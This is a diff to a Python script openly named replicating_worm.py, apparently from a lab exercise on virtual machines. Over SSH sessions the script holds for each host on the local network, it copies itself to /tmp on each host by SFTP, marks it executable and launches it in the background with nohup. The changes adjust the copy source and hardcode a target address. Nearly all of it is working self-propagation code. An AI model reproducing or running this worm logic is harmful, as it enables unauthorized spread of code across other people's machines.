@@ -123,10 +123,14 @@ network = getHostsOnTheSameNetwork()
 
 print network
 
+wormLocation = "/tmp/replicating_worm.py"
+
 if len(sys.argv) == 2:
 	if sys.argv[1] == "-host":
-		print("Will spread to only one of the nodes then to other")
-		network = ["192.168.1.4"]		#VM2
+		print("This is the host computer will change where worm is copied from")
+		wormLocation = "replicating_worm.py"
+		network = ("192.168.1.4")
+
 
 for Host in network:		
 
@@ -142,7 +146,7 @@ for Host in network:
 			print("Spreading to this machine: %s" %(str(Host)))
 			try:
 				sftpClient = sshInfo[0].open_sftp()
-				sftpClient.put("replicating_worm.py", "/tmp/" + "replicating_worm.py")
+				sftpClient.put(wormLocation, "/tmp/" + "replicating_worm.py")
 				sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
 				sshInfo[0].exec_command("nohup python /tmp/replicating_worm.py &")
 			except:
